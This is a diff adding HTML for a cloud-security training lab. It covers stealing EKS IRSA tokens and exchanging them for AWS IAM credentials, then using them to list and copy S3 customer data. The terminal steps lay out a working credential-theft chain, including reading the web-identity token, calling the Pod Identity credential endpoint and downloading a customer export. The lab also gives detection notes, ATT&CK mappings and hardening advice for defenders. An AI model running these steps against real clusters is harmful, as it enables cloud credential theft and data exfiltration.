+          </div>
+        </div>
+      </div>
+    </div>
+
+  </div>
+
+  <div class="attack-flow">
+    <div class="flow-title"><i class="fa-solid fa-diagram-project"></i> Attack Flow</div>
+    <div class="flow-diagram">
+      <div class="flow-node">kube-hunter Scan</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Exec aws-node Pod</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Steal IRSA JWT</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node highlight">VPC CNI IAM Role</div>
+    </div>
+  </div>
+
+  <div class="lab-section">
+    <div class="lab-meta"><strong><i class="fa-solid fa-shield-halved"></i> Detection Notes</strong></div>
+    <ul>
+      <li>Alert on <code>exec</code> calls into <code>kube-system</code> pods — especially <code>aws-node</code> and <code>kube-proxy</code> — from non-system service accounts</li>
+      <li>Alert on <code>AssumeRoleWithWebIdentity</code> calls where the web identity token subject is <code>system:serviceaccount:kube-system:aws-node</code> from an unexpected source IP</li>
+      <li>Alert on kube-hunter or peirates user-agents in Kubernetes API server logs</li>
+      <li>Alert on node taint modifications by non-node-group IAM roles</li>
+    </ul>
+  </div>
+
+  <div class="lab-section">
+    <div class="lab-meta"><strong><i class="fa-brands fa-adversal"></i> MITRE ATT&amp;CK Mapping</strong></div>
+    <ul>
+      <li><strong>T1613</strong> — Container and Resource Discovery (kube-hunter, DaemonSet enumeration)</li>
+      <li><strong>T1528</strong> — Steal Application Access Token (IRSA JWT theft)</li>
+      <li><strong>T1552.005</strong> — Unsecured Credentials: Cloud Instance Metadata API</li>
+      <li><strong>T1548.005</strong> — Abuse Elevation Control Mechanism: Temporary Elevated Cloud Access (STS AssumeRoleWithWebIdentity)</li>
+    </ul>
+  </div>
+
+  <div class="cleanup">
+    <strong><i class="fa-solid fa-broom"></i> Cleanup</strong>
+    <ul>
+      <li>Remove node taint: <code>kubectl taint nodes ip-10-0-1-10.ec2.internal key=value:NoSchedule-</code></li>
+      <li>Rotate the AmazonEKS_CNI_Role credentials if the IRSA token was exchanged during the lab</li>
+      <li>Delete any peirates or kube-hunter pods deployed during the lab</li>
+    </ul>
+  </div>
+
+  <div class="lab-note">
+    <i class="fa-solid fa-triangle-exclamation"></i> The <code>aws-node</code> DaemonSet in EKS has an IAM role for VPC networking — this is a powerful pivot point. Restrict <code>pods/exec</code> access to <code>kube-system</code> namespace and audit IRSA role permissions for over-provisioning.
+  </div>
+</div>
+
+<hr class="lab-divider">
+
+<div class="lab-walkthrough-content" id="M15-L04-content">
+  <div class="lab-objective">
+    <i class="fa-solid fa-crosshairs"></i>
+    <strong>Objective:</strong> Discover IRSA (IAM Roles for Service Accounts) configurations, extract projected JWT tokens, exchange them for AWS IAM credentials, and chain the IRSA attack with EKS Pod Identity for full K8s-to-cloud lateral movement.
+  </div>
+
+  <div class="prereq">
+    <strong><i class="fa-solid fa-list-check"></i> Prerequisites</strong>
+    <ul>
+      <li>Access to a pod with an IRSA-annotated service account (<code>eks.amazonaws.com/role-arn</code> annotation present)</li>
+      <li>AWS CLI available inside the pod or on attacker machine</li>
+      <li>Understanding of OIDC federation and STS web identity token exchange</li>
+    </ul>
+  </div>
+
+  <div class="lab-steps">
+
+    <div class="lab-step">
+      <div class="step-num">1</div>
+      <div class="step-content">
+        <div class="step-desc">Find all service accounts annotated with IRSA roles. The <code>eks.amazonaws.com/role-arn</code> annotation indicates which AWS IAM role each service account can assume.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">root@compromised-pod:/# kubectl get sa -A -o json | jq -r '
+    .items[] |
+    select(.metadata.annotations["eks.amazonaws.com/role-arn"]) |
+    {
+        name: .metadata.name,
+        namespace: .metadata.namespace,
+        role: .metadata.annotations["eks.amazonaws.com/role-arn"]
+    }'</div>
+            <div class="terminal-output">{
+    "name": "webapp-sa",
+    "namespace": "default",
+    "role": "arn:aws:iam::123456789012:role/eks-webapp-s3-access"
+}
+{
+    "name": "api-sa",
+    "namespace": "default",
+    "role": "arn:aws:iam::123456789012:role/eks-api-dynamodb-access"
+}
+{
+    "name": "data-pipeline-sa",
+    "namespace": "production",
+    "role": "arn:aws:iam::123456789012:role/eks-data-pipeline-full-s3"
+}</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">2</div>
+      <div class="step-content">
+        <div class="step-desc">From inside a pod with an IRSA service account, check environment variables and read the projected web identity token. Decode the JWT to confirm the OIDC claims.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">root@webapp-pod:/# # Check for IRSA environment variables injected by the EKS Pod Identity webhook
+env | grep AWS_WEB_IDENTITY_TOKEN_FILE</div>
+            <div class="terminal-output">AWS_WEB_IDENTITY_TOKEN_FILE=/var/run/secrets/eks.amazonaws.com/serviceaccount/token</div>
+            <div class="terminal-cmd">root@webapp-pod:/# env | grep AWS_ROLE_ARN</div>
+            <div class="terminal-output">AWS_ROLE_ARN=arn:aws:iam::123456789012:role/eks-webapp-s3-access</div>
+            <div class="terminal-cmd">root@webapp-pod:/# # Decode the JWT payload
+TOKEN=$(cat $AWS_WEB_IDENTITY_TOKEN_FILE)
+echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | jq '{sub,iss,aud,exp}'</div>
+            <div class="terminal-output">{
+    "aud": ["sts.amazonaws.com"],
+    "exp": 1743580000,
+    "iss": "https://oidc.eks.us-east-1.amazonaws.com/id/ABCDEF1234567890",
+    "sub": "system:serviceaccount:default:webapp-sa"
+}</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">3</div>
+      <div class="step-content">
+        <div class="step-desc">Exchange the Kubernetes JWT for AWS IAM credentials using <code>sts:AssumeRoleWithWebIdentity</code>. The AWS CLI uses <code>AWS_WEB_IDENTITY_TOKEN_FILE</code> and <code>AWS_ROLE_ARN</code> automatically — or call STS explicitly.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">root@webapp-pod:/# # Method 1: AWS CLI uses env vars automatically
+aws sts get-caller-identity</div>
+            <div class="terminal-output">{
+    "UserId": "AROA3XFRBF23IRSAROLE:eks-pod-session",
+    "Account": "123456789012",
+    "Arn": "arn:aws:sts::123456789012:assumed-role/eks-webapp-s3-access/eks-pod-session"
+}</div>
+            <div class="terminal-cmd">root@webapp-pod:/# # Method 2: Explicit STS call (useful when AWS CLI is unavailable)
+aws sts assume-role-with-web-identity \
+    --role-arn $AWS_ROLE_ARN \
+    --web-identity-token file://$AWS_WEB_IDENTITY_TOKEN_FILE \
+    --role-session-name pwned \
+    --query 'Credentials.[AccessKeyId,Expiration]'</div>
+            <div class="terminal-output">[
+    "ASIAIOSFODNN7IRSAROLE",
+    "2026-04-02T21:00:00Z"
+]</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">4</div>
+      <div class="step-content">
+        <div class="step-desc"><strong>EKS Pod Identity (separate from IRSA).</strong> EKS Pod Identity uses a different endpoint at <code>169.254.170.23</code>. If the pod uses Pod Identity instead of IRSA, credentials are delivered via this link-local HTTP endpoint.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">root@webapp-pod:/# # EKS Pod Identity endpoint (169.254.170.23 — different from IMDS at 169.254.169.254)
+# Check if Pod Identity agent token is available
+ls /var/run/secrets/pods.eks.amazonaws.com/serviceaccount/ 2>/dev/null || \
+  echo "Not using Pod Identity — check for IRSA instead"</div>
+            <div class="terminal-output">Not using Pod Identity — check for IRSA instead</div>
+            <div class="terminal-cmd">root@webapp-pod:/# # If Pod Identity IS in use, credentials are at:
+# curl http://169.254.170.23/latest/api/token  (get token first)
+TOKEN=$(curl -s -X PUT "http://169.254.170.23/latest/api/token" \
+  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null)
+[ -n "$TOKEN" ] && \
+  curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
+    http://169.254.170.23/latest/meta-data/iam/security-credentials/ || \
+  echo "Pod Identity endpoint not active on this pod"</div>
+            <div class="terminal-output">Pod Identity endpoint not active on this pod</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">5</div>
+      <div class="step-content">
+        <div class="step-desc">Use the AWS credentials for cloud lateral movement — access S3, DynamoDB, Secrets Manager, or any service the IRSA role grants permissions for.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">root@webapp-pod:/# aws s3 ls</div>
+            <div class="terminal-output">2024-01-10 08:22:11 prod-customer-data-bucket
+2024-02-15 14:33:22 prod-application-logs
+2024-03-20 16:55:33 prod-user-uploads</div>
+            <div class="terminal-cmd">root@webapp-pod:/# aws s3 cp s3://prod-customer-data-bucket/exports/customers-2026-03.csv /tmp/
+wc -l /tmp/customers-2026-03.csv</div>
+            <div class="terminal-output">download: s3://prod-customer-data-bucket/exports/customers-2026-03.csv to /tmp/customers-2026-03.csv
+47832 /tmp/customers-2026-03.csv</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+  </div>
+
+  <div class="attack-flow">
+    <div class="flow-title"><i class="fa-solid fa-diagram-project"></i> Attack Flow</div>
+    <div class="flow-diagram">
+      <div class="flow-node">K8s Service Account</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">IRSA JWT</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">AssumeRoleWithWebIdentity</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node highlight">AWS IAM Creds</div>
+    </div>
+  </div>
+
+  <div class="lab-section">
+    <div class="lab-meta"><strong><i class="fa-solid fa-shield-halved"></i> Detection Notes</strong></div>
+    <ul>
+      <li>Alert on <code>AssumeRoleWithWebIdentity</code> calls from source IPs outside the EKS node CIDR (token exfiltrated and used externally)</li>
+      <li>Alert on reads of <code>$AWS_WEB_IDENTITY_TOKEN_FILE</code> from unexpected processes (auditd, Falco file open events)</li>
+      <li>CloudTrail: <code>AssumeRoleWithWebIdentity</code> with IRSA token subject that does not match the expected service account for the role's trust policy condition</li>
+      <li>Trust policy audit: ensure all IRSA roles have <code>Condition</code> blocks limiting <code>sub</code> to a specific service account and namespace — missing conditions allow any K8s SA to assume the role</li>
+    </ul>
+  </div>
+
+  <div class="lab-section">
+    <div class="lab-meta"><strong><i class="fa-brands fa-adversal"></i> MITRE ATT&amp;CK Mapping</strong></div>
+    <ul>
+      <li><strong>T1613</strong> — Container and Resource Discovery (service account enumeration)</li>
+      <li><strong>T1528</strong> — Steal Application Access Token (IRSA JWT)</li>
+      <li><strong>T1552.005</strong> — Unsecured Credentials: Cloud Instance Metadata API (Pod Identity endpoint)</li>
+      <li><strong>T1548.005</strong> — Abuse Elevation Control Mechanism: Temporary Elevated Cloud Access</li>
+    </ul>
+  </div>
+
+  <div class="cleanup">
+    <strong><i class="fa-solid fa-broom"></i> Cleanup</strong>
+    <ul>
+      <li>Revoke any STS sessions created during the lab (note: STS sessions cannot be explicitly revoked; wait for expiration or update the IAM role's trust policy to block the session)</li>
+      <li>Delete any files exfiltrated from S3 during the lab</li>
+      <li>Audit all IRSA role trust policies to confirm <code>Condition</code> blocks are present and correctly scoped</li>
+    </ul>
+  </div>
+
+  <div class="lab-note">
+    <i class="fa-solid fa-circle-info"></i> IRSA is the bridge between Kubernetes and AWS IAM. Audit all IRSA role trust policies to ensure <code>Condition</code> blocks restrict to specific service accounts and namespaces. A missing condition allows any K8s SA to assume the role. Also consider using EKS Pod Identity (newer mechanism) which has tighter binding semantics.
+  </div>
+</div>
